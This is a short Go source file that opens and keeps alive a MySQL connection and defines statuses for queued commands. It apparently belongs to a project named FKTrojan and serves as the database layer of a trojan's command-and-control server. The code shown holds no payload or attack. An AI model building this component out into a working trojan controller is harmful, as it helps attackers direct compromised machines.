package database

import (
	"database/sql"

	"FKTrojan/config"

	"fmt"
	"os"

	"time"

	_ "github.com/go-sql-driver/mysql"
)

type CommandStatus int

const (
	STATUS_NEW CommandStatus = iota
	STATUS_DOING
	STATUS_DONE
	STATUS_ERR
)

var (
	dbPointer *sql.DB
)

func Init() {
	var err error
	dbPointer, err = sql.Open("mysql", fmt.Sprintf("%s:%s@%s/%s?parseTime=true",
		config.Conf.MySQLUser, config.Conf.MySQLPass,
		config.Conf.MySQLHost,
		config.Conf.MySQLName,
	))
	if err != nil {
		fmt.Printf("sql.Open error %v", err)
		os.Exit(1)
	}
	err = dbPointer.Ping()
	if err != nil {
		fmt.Printf("sql.Ping error %v", err)
		os.Exit(1)
	}
}

func KeepAlive() error {
	for {
		err := dbPointer.Ping()
		if err != nil {
			return err
		}
		time.Sleep(time.Second * 5)
	}
	return nil
}
